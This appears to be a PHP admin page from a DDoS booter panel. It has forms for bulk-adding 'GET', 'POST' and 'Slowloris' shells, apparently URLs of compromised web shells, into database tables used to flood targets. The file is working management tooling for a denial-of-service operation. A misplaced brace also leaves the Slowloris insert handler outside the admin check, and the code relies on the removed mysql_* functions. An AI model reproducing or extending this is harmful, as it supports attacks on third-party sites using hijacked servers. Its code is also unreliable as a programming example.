<?php
require 'header.php';
?>

    <?php if (checkAdmin()) { ?>

<div class="box">
    <h2>Add a Get Shell(s)</h2>
    <div class="box-content">
<center>
<form name="frmcontadd" action="" method="post">

  <textarea class="entryfield" name="url" cols=115 rows=10></textarea><br>
  <input class="button" type="submit" name="Submit" value="Add GET Shell(s)">

</form>
</center>
</div>
</div>
<div class="box">
    <h2>Add a POST Shell(s)</h2>
    <div class="box-content">
<center>
<form name="frmcontadd" action="" method="post">

  <textarea class="entryfield" name="url2" cols=115 rows=10></textarea><br>
  <input class="button" type="submit" name="Submit2" value="Add POST Shell(s)">

</form>
</center>
</div>
</div>
<div class="box">
    <h2>Add a Slowloris Shell(s)</h2>
    <div class="box-content">
<center>
<form name="frmcontadd" action="" method="post">

  <textarea class="entryfield" name="url3" cols=115 rows=10></textarea><br>
  <input class="button" type="submit" name="Submit3" value="Add Slowloris Shell(s)">

</form>
</center>
</div>
</div>
<?php
// first the check of a submitted form
if (isset($_POST['Submit'])) {
  $hosts = explode("\r\n", $_POST['url']);
  // let's create the INSERT query
  $values = array();
  foreach ($hosts as $host) {
    $values[] .= "('" . mysql_real_escape_string($host) . "')";
  }
  $query = "INSERT INTO getshells (url) VALUES " . implode(',', $values);
  $result = mysql_query($query) or die("mysql error " . mysql_error() . " in query $query");
  echo '<hr>Successfully added GET Shells to the shells database.';
}

// then the form itself
?>

<?php
// first the check of a submitted form
if (isset($_POST['Submit2'])) {
  $hosts2 = explode("\r\n", $_POST['url2']);
  // let's create the INSERT query
  $values = array();
  foreach ($hosts2 as $host2) {
    $values[] .= "('" . mysql_real_escape_string($host2) . "')";
  }
  $query = "INSERT INTO postshells (url) VALUES " . implode(',', $values);
  $result = mysql_query($query) or die("mysql error " . mysql_error() . " in query $query");
  echo '<hr>Successfully added POST Shells to the shells database.';
}
}
// then the form itself
?>
<?php
// first the check of a submitted form
if (isset($_POST['Submit3'])) {
  $hosts3 = explode("\r\n", $_POST['url3']);
  // let's create the INSERT query
  $values = array();
  foreach ($hosts3 as $host3) {
    $values[] .= "('" . mysql_real_escape_string($host3) . "')";
  }
  $query = "INSERT INTO slowloris (url) VALUES " . implode(',', $values);
  $result = mysql_query($query) or die("mysql error " . mysql_error() . " in query $query");
  echo '<hr>Successfully added Slowloris Shells to the shells database.';
}

// then the form itself
?>

<?php
include 'footer.php';
?>